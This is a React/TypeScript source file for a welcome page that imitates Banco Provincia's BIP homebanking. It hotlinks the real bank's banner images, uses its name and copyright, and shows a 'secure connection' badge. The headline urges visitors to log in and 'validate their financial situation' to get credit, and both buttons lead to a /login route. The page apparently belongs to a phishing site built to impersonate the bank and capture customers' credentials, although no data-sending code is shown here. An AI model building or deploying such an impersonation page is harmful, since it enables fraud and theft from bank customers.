// 🏦 Página de Bienvenida BIP - Slider Compacto y Profesional
import { useState, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';

// URLs de imágenes del slider
const sliderImages = [
  'https://www.bancoprovincia.com.ar/CDN/Get/CDNIComercios',
  'https://www.bancoprovincia.com.ar/CDN/Get/banner_home_a_industriales_L',
  'https://www.bancoprovincia.com.ar/CDN/Get/header%20beneficios%20diciembre'
];

const Welcome = () => {
  const navigate = useNavigate();
  const [currentSlide, setCurrentSlide] = useState(0);
  const [selectedOption, setSelectedOption] = useState<'personas' | 'empresas' | null>(null);

  // Función para avanzar slide
  const nextSlide = useCallback(() => {
    setCurrentSlide((prev) => (prev + 1) % sliderImages.length);
  }, []);

  const prevSlide = useCallback(() => {
    setCurrentSlide((prev) => (prev - 1 + sliderImages.length) % sliderImages.length);
  }, []);

  // Auto-slide cada 4 segundos
  useEffect(() => {
    const timer = setInterval(nextSlide, 4000);
    return () => clearInterval(timer);
  }, [nextSlide]);

  const handleOptionSelect = (option: 'personas' | 'empresas') => {
    setSelectedOption(option);
    localStorage.setItem('bipUserType', option);
    setTimeout(() => navigate('/login'), 400);
  };

  return (
    <div className="min-h-screen min-h-[100dvh] flex flex-col bg-gradient-to-b from-[#1e8a5e] via-[#1a7a52] to-[#166b49]">
      
      {/* ============ HEADER ============ */}
      <header className="bg-gradient-to-r from-[#166b49] via-[#1e8a5e] to-[#22a06b] shadow-lg shrink-0">
        <div className="max-w-6xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-lg bg-white/20 backdrop-blur flex items-center justify-center shadow-md">
              <span className="text-white font-bold text-lg sm:text-xl">BIP</span>
            </div>
            <div className="hidden sm:block">
              <h1 className="text-white font-bold text-sm">Banco Provincia</h1>
              <p className="text-white/70 text-xs">Banca Internet Provincia</p>
            </div>
          </div>
          
          <div className="flex items-center gap-2 text-white/80 text-xs">
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            <span className="hidden sm:inline">Conexión Segura</span>
          </div>
        </div>
      </header>

      {/* ============ CONTENIDO PRINCIPAL ============ */}
      <main className="flex-1 flex flex-col">
        
        {/* LEMA PRINCIPAL */}
        <div className="bg-gradient-to-r from-[#166b49] to-[#1e8a5e] py-4 sm:py-5 px-4">
          <div className="max-w-4xl mx-auto text-center">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/10 backdrop-blur border border-white/20 mb-2">
              <span className="text-[#36bab0] text-xs font-semibold">📋 IMPORTANTE</span>
            </div>
            <h1 className="text-lg sm:text-xl lg:text-2xl font-bold text-white leading-snug">
              Para acceder a tu crédito debes ingresar y completar la{' '}
              <span className="text-[#36bab0]">validación de tu situación financiera</span>
            </h1>
          </div>
        </div>

        {/* OPCIONES DE INGRESO */}
        <div className="py-5 sm:py-6 px-4">
          <div className="max-w-3xl mx-auto">
            {/* Título */}
            <div className="text-center mb-4 sm:mb-5">
              <h2 className="text-xl sm:text-2xl font-bold text-white mb-1">
                Bienvenido a <span className="text-[#36bab0]">BIP</span>
              </h2>
              <p className="text-white/70 text-sm">
                Seleccioná tu tipo de cuenta para continuar
              </p>
            </div>

            {/* Tarjetas */}
            <div className="grid sm:grid-cols-2 gap-4">
              
              {/* BIP Personas */}
              <button
                onClick={() => handleOptionSelect('personas')}
                className={`group relative p-5 rounded-xl transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] text-left bg-white/10 backdrop-blur border border-white/20 hover:border-[#36bab0]/50 ${
                  selectedOption === 'personas' ? 'ring-2 ring-[#36bab0] scale-[1.02]' : ''
                }`}
              >
                <div className="flex items-start gap-4">
                  <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#2eb8a0] to-[#36bab0] flex items-center justify-center shadow-lg shrink-0">
                    <svg className="w-6 h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                    </svg>
                  </div>
                  <div className="flex-1 min-w-0">
                    <h3 className="text-lg font-bold text-white mb-1">BIP Personas</h3>
                    <p className="text-white/80 text-sm mb-2">Homebanking personal</p>
                    <div className="flex items-center gap-1.5 text-white text-sm font-semibold group-hover:text-[#36bab0] transition-colors">
                      <span>Ingresar</span>
                      <svg className="w-4 h-4 transform group-hover:translate-x-1 transition-transform" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
                      </svg>
                    </div>
                  </div>
                </div>
              </button>

              {/* BIP Empresas */}
              <button
                onClick={() => handleOptionSelect('empresas')}
                className={`group relative p-5 rounded-xl transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] text-left bg-white/10 backdrop-blur border border-white/20 hover:border-[#36bab0]/50 ${
                  selectedOption === 'empresas' ? 'ring-2 ring-[#36bab0] scale-[1.02]' : ''
                }`}
              >
                <div className="flex items-start gap-4">
                  <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#1e8a5e] to-[#2eb8a0] flex items-center justify-center shadow-lg shrink-0">
                    <svg className="w-6 h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4" />
                    </svg>
                  </div>
                  <div className="flex-1 min-w-0">
                    <h3 className="text-lg font-bold text-white mb-1">BIP Empresas</h3>
                    <p className="text-white/80 text-sm mb-2">Soluciones corporativas</p>
                    <div className="flex items-center gap-1.5 text-white text-sm font-semibold group-hover:text-[#36bab0] transition-colors">
                      <span>Ingresar</span>
                      <svg className="w-4 h-4 transform group-hover:translate-x-1 transition-transform" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
                      </svg>
                    </div>
                  </div>
                </div>
              </button>
            </div>
          </div>
        </div>

        {/* SLIDER - CENTRADO Y FULL WIDTH */}
        <div className="bg-[#145a3d] py-4 px-4">
          <p className="text-white/70 text-xs text-center mb-3 font-medium">Promociones y beneficios</p>
          <div className="w-full max-w-5xl mx-auto">
            <div 
              className="relative w-full rounded-xl overflow-hidden shadow-2xl bg-[#0d3d2a]"
              style={{ height: '200px' }}
            >
              {/* Imágenes */}
              {sliderImages.map((src, index) => (
                <div
                  key={index}
                  className={`absolute inset-0 transition-opacity duration-1000 ease-in-out ${
                    index === currentSlide ? 'opacity-100' : 'opacity-0'
                  }`}
                >
                  <img
                    src={src}
                    alt={`Promoción ${index + 1}`}
                    className="w-full h-full object-cover object-center"
                    loading={index === 0 ? 'eager' : 'lazy'}
                  />
                </div>
              ))}
              
              {/* Overlay suave */}
              <div className="absolute inset-0 bg-gradient-to-t from-black/30 via-transparent to-transparent pointer-events-none" />
              
              {/* Indicadores */}
              <div className="absolute bottom-3 left-1/2 -translate-x-1/2 flex gap-2">
                {sliderImages.map((_, index) => (
                  <button
                    key={index}
                    onClick={() => setCurrentSlide(index)}
                    className={`transition-all duration-300 rounded-full ${
                      index === currentSlide
                        ? 'w-8 h-2 bg-white'
                        : 'w-2 h-2 bg-white/50 hover:bg-white/70'
                    }`}
                  />
                ))}
              </div>
              
              {/* Flechas */}
              <button
                onClick={prevSlide}
                className="absolute left-3 top-1/2 -translate-y-1/2 w-10 h-10 rounded-full bg-black/40 hover:bg-black/60 flex items-center justify-center text-white transition-colors"
              >
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                </svg>
              </button>
              <button
                onClick={nextSlide}
                className="absolute right-3 top-1/2 -translate-y-1/2 w-10 h-10 rounded-full bg-black/40 hover:bg-black/60 flex items-center justify-center text-white transition-colors"
              >
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                </svg>
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* ============ FOOTER ============ */}
      <footer className="bg-[#0d3d2a] border-t border-white/10 shrink-0">
        <div className="max-w-6xl mx-auto px-4 py-3">
          <div className="flex flex-col sm:flex-row items-center justify-between gap-2">
            <div className="flex items-center gap-3 text-white/40 text-xs">
              <a href="#" className="hover:text-white/70 transition-colors">Términos</a>
              <span>|</span>
              <a href="#" className="hover:text-white/70 transition-colors">Privacidad</a>
              <span>|</span>
              <a href="#" className="hover:text-white/70 transition-colors">Seguridad</a>
            </div>
            <p className="text-white/30 text-xs">
              © 2026 Banco de la Provincia de Buenos Aires
            </p>
          </div>
        </div>
      </footer>

      {/* Transición */}
      {selectedOption && (
        <div 
          className="fixed inset-0 z-50 pointer-events-none bg-[#1e8a5e]"
          style={{ animation: 'fadeIn 0.4s ease-out forwards' }}
        />
      )}

      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
      `}</style>
    </div>
  );
};

export default Welcome;
